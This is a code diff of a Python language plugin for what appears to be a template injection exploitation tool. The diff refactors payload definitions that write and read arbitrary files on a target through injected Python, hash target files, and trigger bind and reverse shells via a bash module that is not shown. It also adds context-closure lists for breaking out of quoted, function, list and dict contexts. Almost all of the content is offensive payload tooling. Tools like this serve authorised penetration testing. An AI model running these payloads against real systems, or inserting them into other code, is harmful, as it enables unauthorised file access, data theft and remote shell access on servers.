@@ -1,6 +1,7 @@
 from utils.strings import quote
 from core.plugin import Plugin
-from core import languages
+from utils import closures
+from plugins.languages import bash
 from utils.loggers import log
 from utils import rand
 import base64
@@ -24,16 +25,16 @@ class Python(Plugin):
                 }
             },
             'write' : {
-                'call' : 'render',
+                'call' : 'evaluate',
                 'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk_b64)s'))""",
                 'truncate' : """open("%(path)s", 'w').close()"""
             },
             'read' : {
-                'call': 'render',
+                'call': 'evaluate',
                 'read' : """__import__("base64").b64encode(open("%(path)s", "rb").read())"""
             },
             'md5' : {
-                'call': 'render',
+                'call': 'evaluate',
                 'md5': """__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest()"""
             },
             'evaluate' : {
@@ -55,11 +56,11 @@ class Python(Plugin):
             },
             'bind_shell' : {
                 'call' : 'execute_blind',
-                'bind_shell': languages.bash_bind_shell
+                'bind_shell': bash.bind_shell
             },
             'reverse_shell' : {
                 'call': 'execute_blind',
-                'reverse_shell' : languages.bash_reverse_shell
+                'reverse_shell' : bash.reverse_shell
             },
             'execute_blind' : {
                 'call': 'evaluate',
@@ -107,3 +108,30 @@ class Python(Plugin):
             self.set('write', True)
             self.set('bind_shell', True)
             self.set('reverse_shell', True)
+
+
+ctx_closures = {
+        1: [
+            closures.close_single_duble_quotes + closures.integer,
+            closures.close_function + closures.empty
+        ],
+        2: [
+            closures.close_single_duble_quotes + closures.integer + closures.string,
+            closures.close_function + closures.empty
+        ],
+        3: [
+            closures.close_single_duble_quotes + closures.integer + closures.string + closures.close_triple_quotes,
+            closures.close_function + closures.close_list + closures.close_dict + closures.empty
+        ],
+        4: [
+            closures.close_single_duble_quotes + closures.integer + closures.string + closures.close_triple_quotes,
+            closures.close_function + closures.close_list + closures.close_dict + closures.empty
+        ],
+        5: [
+            closures.close_single_duble_quotes + closures.integer + closures.string + closures.close_triple_quotes,
+            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
+            closures.close_function + closures.close_list + closures.empty,
+            closures.if_loops + closures.empty
+        ],
+}
+
